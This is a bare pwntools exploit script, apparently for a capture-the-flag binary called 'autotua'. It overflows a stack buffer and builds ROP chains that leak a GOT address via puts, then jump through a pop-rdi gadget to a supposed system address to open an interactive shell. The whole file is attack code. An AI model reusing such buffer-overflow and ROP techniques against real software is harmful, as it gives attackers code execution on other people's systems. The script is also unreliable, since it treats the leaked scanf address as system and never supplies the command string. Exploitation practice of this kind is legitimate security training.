from pwn import *

context.log_level="debug"
context.arch = 'amd64'
'''
import base64

x = remote("1.224.175.29", 9981)
bdata = x.recvuntil("------")

with open("./autotua", 'wb') as f:
	f.write(base64.b64decode(bdata))

'''

x = process("./autotua")
e = ELF("./autotua")
lib = e.libc

x.sendlineafter("=========\n", '1')

rop = ROP(e)
rop.raw("a"*0x118)
rop.puts(e.got['__isoc99_scanf'])
rop.read(0, e.bss(), 8)
rop.raw(e.symbols['main'])

pause()

print(rop.dump())

x.sendline(rop.chain())
x.sendlineafter("=========\n", '3')

poprdi = 0x000400823
system = u64(x.recv(8))

x.sendlineafter("=========\n", '1')

rop = ROP(e)
rop.raw("a"*0x118)
rop.raw(poprdi)
rop.raw(e.bss())
rop.raw(system)

x.sendline(rop.chain())
x.sendlineafter("=========\n", '3')
x.interactive()

